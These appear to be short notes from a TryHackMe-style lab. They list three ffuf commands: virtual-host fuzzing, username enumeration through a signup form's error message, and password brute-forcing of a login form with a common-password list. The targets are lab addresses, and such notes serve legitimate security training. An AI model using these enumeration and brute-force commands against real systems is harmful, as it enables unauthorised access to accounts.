ffuf \-w /usr/share/wordlists/seclists/Discovery/DNS/namelist\.txt \-H "Host: FUZZ\.acmeitsupport\.thm" \-u [http://10.10.133.186](#http://10.10.133.186)
\-fs 2395
**
username enumeration**
ffuf \-w /usr/share/wordlists/seclists/Usernames/Names/names\.txt \-X POST \-d "username=FUZZ\&email=x\&password=x\&cpassword=x" \-H "Content\-Type: application/x\-www\-form\-urlencoded" \-u [http://10.10.77.47/customers/signup](#http://10.10.77.47/customers/signup)
\-mr "username already exists"

**password bruteforce
**ffuf \-w users\.txt:W1,/usr/share/wordlists/seclists/Passwords/Common\-Credentials/10\-million\-password\-list\-top\-100\.txt:W2 \-X POST \-d "username=W1\&password=W2" \-H "Content\-Type: application/x\-www\-form\-urlencoded" \-u [http://10.10.77.47/customers/login](#http://10.10.77.47/customers/login)
\-fc 200

